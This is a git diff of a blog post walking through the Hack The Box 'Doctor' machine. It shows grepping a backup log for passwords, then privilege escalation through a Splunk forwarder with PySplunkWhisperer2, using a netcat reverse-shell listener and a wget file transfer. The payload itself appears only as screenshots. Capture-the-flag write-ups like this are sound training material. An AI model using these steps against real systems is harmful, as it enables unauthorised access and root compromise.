@@ -1,9 +1,9 @@
 --- 
 titile: Doctor Machine 
 author: Software User
-date: 2021-03-13 16:31:00 +0800
+date: 2021-02-13 16:31:00 +0800
 category: hackthebox
-tags: [htb-machine,htb,doctor]
+tags: [htb-machines,htb,doctor,ssti,hackthebox]
 --- 
 
 ![Desktop View]({{ "/assets/img/htb-machines/doctor/1.png" | relative_url }})
@@ -70,7 +70,6 @@ let's add this domain to our hosts (/etc/hosts) file
 ```markdown
 Send us a message
 info@doctors.htb
-
 ```
 
 
@@ -181,12 +180,13 @@ now let's access the /archive we got a shell as web@doctor
 
 we don't have permission to read user.txt we have tp enumerate more after some time i found some log files but there is an backup so i found creds in that file of probably user shaun because shaun contains our user.txt 
 
-
-![Desktop View]({{ "/assets/img/htb-machines/doctor/25.png" | relative_url }})
-
 ```markdown
 cat backup | grep -iE "password" 
 ``` 
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/25.png" | relative_url }})
+
+
 
 got user
 
@@ -194,10 +194,53 @@ got user
 
 # Root Part 
 
-if we check 
+As always i will run [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) after running linPEAS i found splunk is running
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/27.png" | relative_url }})
+<!-- ![Desktop View]({{ "/assets/img/htb-machines/doctor/27.png" | relative_url }}) -->
+
+Splunk forwarder is one of the components of splunk infrastructure. Splunk forwarder basically acts as agent for log collection from remote machines .Splunk forwarder collects logs from remote machines and forward s them to indexer (Splunk database) for further processing and storage. Read more about splunk here [splunk](https://www.learnsplunk.com/splunk-forwarder-install.html)
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/splunk-py.png"}})
+
+After googling i found an script which can be used here for privilege escalation [PySplunkWhisperer2](https://github.com/DaniloCaruso/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
+
+# PySplunkWhisperer2
+--- 
+
+we have to start a netcat listener and then we have to run PySplunkWhisperer2 on our system
+
+```
+
+nc -lnvp 5006 # you'r machine
+python3 -m http.server 80 # you'r machine
+wget http://10.10.xx.xxx:80/PySplunkWhisperer2_remote.py # your machine
+
+```
 
 
+Let's run netcat listener 
 
 
+![Desktop View]({{ "/assets/img/htb-machines/doctor/29.png" | relative_url }})
+
+Let's run PySplunkWhisperer2 to get shell 
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/30.png" | relative_url }})
+
+payload 
+
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/mainp.png" | relative_url }})
+
+we got a shell   
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/31.png" relative_url }})
+
+now we can read root.txt 
+
+![Desktop View]({{ "/assets/img/htb-machines/doctor/32.png" relative_url }})
+
+Thank you for reading my blog if you have any suggestions feel free to contact me on [twitter](https://twitter.com/softwareuser_).
 
 ---
